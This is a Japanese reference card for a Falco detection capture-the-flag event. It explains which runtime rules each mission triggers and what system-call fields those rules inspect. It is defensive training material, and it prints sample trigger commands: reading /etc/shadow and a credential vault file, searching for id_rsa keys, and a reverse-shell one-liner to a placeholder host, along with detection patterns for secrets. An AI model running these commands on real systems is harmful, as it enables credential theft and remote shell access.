# Falco CTF リファレンスカード

ワークスペースで詰まったときに横目で見るためのチートシート。
事前にざっと眺めておくと当日が楽になります。

---

## 1. 自分が誰か / どこにいるか

```bash
echo $FALCO_CTF_USER         # ユーザ名 (= ctf-<username> namespace の username)
ls /opt/ctf/missions/        # ミッション一覧 (ミッションごとの directory)
cat /opt/ctf/missions/<NN>-<slug>/fixtures/welcome.txt   # 目的・種類・提出方法
hostname                     # = pod 名 (workspace)
cat /etc/os-release          # alpine 3.20 ベース
```

---

## 2. Falco が観測しているフィールド (主要)

| フィールド | 意味 | どこから来るか |
|---|---|---|
| `fd.name` | open された fd の path | `openat(2)` 引数 |
| `fd.directory` | 上の dir 部分 | 〃 |
| `proc.name` | プロセスの comm (basename of exe) | `/proc/<pid>/comm` |
| `proc.pname` | **親**プロセスの comm | 〃 (parent) |
| `proc.cmdline` | コマンドライン文字列全体 | `/proc/<pid>/cmdline` |
| `proc.exe` | 実行ファイルのフルパス | kernel exec 情報 |
| `proc.aname[N]` | N 世代上の祖先 comm | 〃 |
| `container.image.repository` | コンテナイメージ名 | CRI socket |
| `k8s.ns.name` | Pod の Namespace | K8s API watcher |
| `k8s.pod.name` | Pod 名 | 〃 |

**重要**: ルールは syscall 単位で評価されますが、判定条件は **ほぼ
すべて文字列マッチ**です。同じ inode を別 path で開けば検知ロジック
からは別物に見えます。

---

## 3. このイベントで出題される Falco ルール

ここに書くのは各ルールが **何を見ているか** だけ。回避 (evade) の手順は載せて
いない — ポータルの Story タブの段階ヒント (気付き → 概要 → 解答、開示すると
減点) で確認する。

### 3.1 `Read sensitive file untrusted`

| 項目 | 内容 |
|---|---|
| 何を見るか | `fd.name` が `/etc/shadow` / `/etc/sudoers` / `/etc/pam.d/*` 等の sensitive_files に一致 |
| 発火条件 (大意) | `open_read` syscall で対象パスを開いた + 開いたプロセスが trusted リスト外 |
| 出題 | **02 (発火)**, **03 (回避)**, **10 (回避)** |

実 condition (抜粋): `open_read and sensitive_files and proc_name_exists and not proc.name in (許可リスト...) and not <user_known 例外>`

発火する例 (02 は `/etc/shadow` を正面から読んで発火させる trigger、03/10 は
資格情報退避用の vault ファイル (`/opt/nimbus/vault/creds.recover` / `master.key`)
を同じルールに気づかれず読む evade — 対象ファイルが違う点に注意):
```bash
cat /etc/shadow                                      # ← 発火する (Mission 02)
cat /opt/nimbus/vault/creds.recover                  # ← こちらも同ルールの対象。発火する
```

### 3.2 `Search Private Keys or Passwords`

| 項目 | 内容 |
|---|---|
| 何を見るか | `proc.cmdline` に `id_rsa` / `id_dsa` / `BEGIN.*PRIVATE KEY` / `AWS_SECRET` 等 |
| 発火条件 | 上記パターンを含むコマンドが exec された (結果は問わない) |
| 出題 | **04 (発火)**, **05 (回避)**, 10 (回避) |

実 condition (抜粋): `spawned_process and ((grep_commands and private_key_or_password) or (proc.name=find and proc.args contains "id_rsa" ...))`

例:
```bash
find /tmp -iname id_rsa                 # ← 発火 (cmdline に "id_rsa")
```

### 3.3 `Run shell untrusted`

| 項目 | 内容 |
|---|---|
| 何を見るか | `proc.pname` (親 comm) が `protected_shell_spawner` (`httpd`/`nginx`/`apache2`/`postgres` 等) |
| 発火条件 | shell (bash/sh/zsh) が起動 + 親 comm が上記リスト |
| 出題 | **06 (発火)**, 10 (回避) |

実 condition (抜粋): `spawned_process and shell_procs and proc.pname exists and protected_shell_spawner and not proc.pname in (shell_binaries, ...)`

`proc.pname` は kernel が実行ファイルの basename から決める。親が `bash` / `sh` なら
通常の操作として扱われ、親が Web サーバ名のときに発火する。

### 3.4 `Contact K8S API Server From Container`

| 項目 | 内容 |
|---|---|
| 何を見るか | `evt.type=connect` + dst = K8s API server + `not k8s_containers` + `not user_known_*` |
| 発火条件 | system pod 以外のコンテナから K8s API への connect |
| 出題 | **01 (発火)**, 10 (回避) |

実 condition (抜粋): `evt.type=connect and (fd.typechar=4 or fd.typechar=6) and container and k8s_api_server and not k8s_containers and not user_known_contact_k8s_api_server_activities`

認証が失敗しても、TCP connect が成立した時点で発火する。

### 3.5 `Drop and execute new binary in container`

| 項目 | 内容 |
|---|---|
| 何を見るか | `spawned_process` + container + `proc.is_exe_upper_layer=true` |
| 発火条件 | overlayfs の upper layer (= runtime に追加された層) から exec |
| 出題 | **07 (発火)**, 10 (回避) |

実 condition (抜粋): `spawned_process and container and proc.is_exe_upper_layer=true and not container.image.repository in (known_drop_and_execute_containers)`

runtime に書いたファイルは upper layer に積まれる。base image に元からある binary
(例: `/bin/ls`) の実行では発火しない。

### 3.6 `Redirect STDOUT/STDIN to Network Connection in Container`

| 項目 | 内容 |
|---|---|
| 何を見るか | `dup` syscall + container + `fd.type ∈ {ipv4,ipv6}` + `evt.rawres ∈ {0,1,2}` |
| 発火条件 | network socket fd を stdin/stdout/stderr に dup する (= reverse shell の典型) |
| 出題 | **08 (発火)**, 10 (回避) |

実 condition (抜粋): `dup and container and evt.rawres in (0,1,2) and fd.type in ("ipv4","ipv6") and not user_known_stand_streams_redirect_activities`

古典的な reverse shell の形 (接続が成立して dup に到達したときに発火する):
```bash
bash -i >& /dev/tcp/<host>/<port> 0>&1
```
このワークスペースは egress lockdown 済みで、collector / DNS / API server 以外への
接続は silently drop される (connect がハングして dup に到達しない = 発火しない)。

### 3.7 `Create Hardlink Over Sensitive Files` / `Create Symlink Over Sensitive Files`

| 項目 | 内容 |
|---|---|
| 何を見るか | `link` / `symlink` syscall + 対象が `sensitive_files` macro 該当 |
| 発火条件 | sensitive file への hard/symbolic link 作成 |
| 出題 | **09 (発火: Hardlink)**, 10 (回避: Hardlink) |

実 condition (抜粋, Hardlink): `create_hardlink and (evt.arg.oldpath in (sensitive_file_names))`

例:
```bash
ln    <sensitive file> <リンク先>     # ← hardlink (inode への直接参照)
ln -s <sensitive file> <リンク先>     # ← symlink (path への参照、別 rule)
```

---

## 4. コマンド ↔ syscall 早見

| やりたいこと | 発火する形 | 見られているもの |
|---|---|---|
| 機密ファイルの中身を見る | `cat <sensitive-path>` | open に渡した path (`fd.name`) |
| 鍵ファイルを探す | `find / -iname id_rsa` | コマンドライン (`proc.cmdline`) |
| shell を起こす | 親 comm が httpd/nginx 等 | 親プロセス名 (`proc.pname`)。親が shell なら発火しない |

---

## 5. 行き詰まったときの定石

1. **Story タブ (Journey UI) のヒントを段階的に開く** — 気付き→概要→解答の順で
   開示される (開示すると減点。`welcome.txt` は目的と提出方法の再確認に:
   `cat /opt/ctf/missions/<NN>-<slug>/fixtures/welcome.txt`)
2. **Falco ルール本体を読む** — 何を見ているかを直接確認
   - 参考: https://github.com/falcosecurity/rules/blob/main/rules/falco_rules.yaml
3. **ポータルのコマンド集を引く** — ヒントから参照される一般的な Linux コマンドの早見
4. **提出スクリプトを覗く** — `cat /opt/ctf/submit.sh` 等で
   提出ロジックの中身がわかる

---

## 6. このリファレンスの場所

- 事前配布版: `falco-ctf-app/challenges/REFERENCE.md` (本ファイル)
- ワークスペース内: 本イベントの版数では未バンドル (`PARTICIPANT-HANDBOOK.md`
  と一緒に運営から配布されているはず)

質問・修正提案は運営まで。
